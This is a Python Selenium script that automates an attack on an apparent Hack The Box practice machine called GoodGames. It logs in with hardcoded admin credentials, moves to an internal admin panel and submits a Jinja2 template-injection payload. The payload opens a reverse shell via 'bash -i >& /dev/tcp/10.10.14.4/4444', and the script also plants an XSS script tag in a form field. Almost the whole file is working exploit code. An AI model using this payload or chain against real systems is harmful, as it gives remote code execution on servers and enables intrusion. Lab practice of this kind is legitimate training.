import requests
from selenium import webdriver
import re
from selenium.webdriver.common.by import By
from urllib.parse import urljoin


def login_to_internal_admin(driver):
    driver.get("http://internal-administration.goodgames.htb")

    username_field = driver.find_element(By.ID, "username_login")
    username_field.send_keys("admin")

    password_field = driver.find_element(By.ID, "pwd_login")
    password_field.send_keys("superadministrator")

    driver.find_element(By.NAME, "login").click()


def get_internal_links_from_source(driver):
    links_dict = {}
    source = driver.page_source
    base_url = "http://internal-administration.goodgames.htb"

    relative_links = re.findall(r'href="(/[\w-]*)"', source)

    for link in relative_links:
        full_url = urljoin(base_url, link)
        links_dict[link] = full_url

    return links_dict


def populate_form(driver):
    form = driver.find_element(By.XPATH, "//h2[text()='General information']/..//form")

    inputs = form.find_elements(By.TAG_NAME, "input")

    first_input = inputs[0]
    payload = r"""{{ namespace.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.14.4/4444 0>&1"').read() }}"""
    first_input.send_keys(payload)

    # Find name field and inject code
    name_field = driver.find_element(By.ID, "first\_name")
    name_field.send_keys('<script>alert("Code injected!")</script>')

    birthday_field = driver.find_element(By.ID, "birthday")
    birthday_field.send_keys('01/01/2021')

    phone_field = driver.find_element(By.ID, "phone")
    phone_field.send_keys('123456789')
    # Click submit button
    submit_btn = driver.find_element(By.XPATH, "//button[text()='Save all']")
    submit_btn.click()


def submit_form(driver):
    driver.find_element(By.XPATH, "//button[text()='Save all']").click()


def main():
    # Set up the Edge WebDriver
    options = webdriver.EdgeOptions()
    options.add_argument("--headless")
    driver = webdriver.Edge(options=options)

    # Session creation to manage cookies and maintain the session
    session = requests.Session()

    # URL for login
    login_url = 'http://10.10.11.130/login'

    # Data for the POST request
    login_data = {
        'email': 'admin@goodgames.htb',
        'password': 'superadministrator'
        # Add other form fields as needed
    }

    # Login and retrieve the response
    response = session.post(login_url, data=login_data)

    # Check if login was successful
    if response.status_code == 200:
        print("Login successful.")

        # URL for the authenticated page you want to fetch
        authenticated_page_url = 'http://10.10.11.130/'

        # Get cookies from the requests session
        cookies = session.cookies.get_dict()

        # Add cookies to the browser
        driver.get(authenticated_page_url)
        for cookie in cookies:
            driver.add_cookie({
                'name': cookie,
                'value': cookies[cookie],
                'domain': '10.10.11.130',  # Replace with the appropriate domain
                'path': '/'
            })

        # Open the authenticated page using the browser
        driver.get(authenticated_page_url)
        page_source = driver.page_source
        pattern = r'http[s]?://[\w\-.]+\.goodgames\.htb'
        matches = re.findall(pattern, page_source)

        print(matches)
    else:
        print("Login failed. Status code:", response.status_code)

    login_to_internal_admin(driver)
    # Login code
    driver.get("http://internal-administration.goodgames.htb/")
    links = get_internal_links_from_source(driver)
    settings_url = links["/settings"]

    driver.get(settings_url)

    populate_form(driver)
    submit_form(driver)
